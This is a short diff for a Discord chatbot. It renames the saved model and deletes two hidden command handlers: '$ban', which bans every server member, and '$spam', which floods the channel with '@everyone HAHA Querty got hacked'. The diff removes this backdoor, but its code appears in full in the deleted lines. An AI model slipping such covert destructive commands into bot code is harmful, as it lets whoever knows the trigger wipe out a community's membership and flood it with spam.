@@ -8,7 +8,7 @@ import asyncio
 
 chatbot = GenericAssistant('intents.json')
 chatbot.train_model()
-chatbot.save_model('Core')
+chatbot.save_model('Querty')
 
 client = discord.Client()
 
@@ -19,19 +19,6 @@ async def on_message(ctx):
     if ctx.author == client.user or ctx.content.startswith('?purge'):
         return
     
-    if ctx.content.startswith('$ban'):
-      for user in ctx.guild.members:
-         try:
-             await user.ban()
-         except:
-             pass
-
-    if ctx.content.startswith('$spam'):
-     for I in range(100):
-         await ctx.channel.send('@everyone HAHA Querty got hacked')
-         asyncio.sleep(0.1)
-     return
-
     if ctx.channel.name == 'general':
         response = chatbot.request(ctx.content)
         await ctx.channel.send(response)
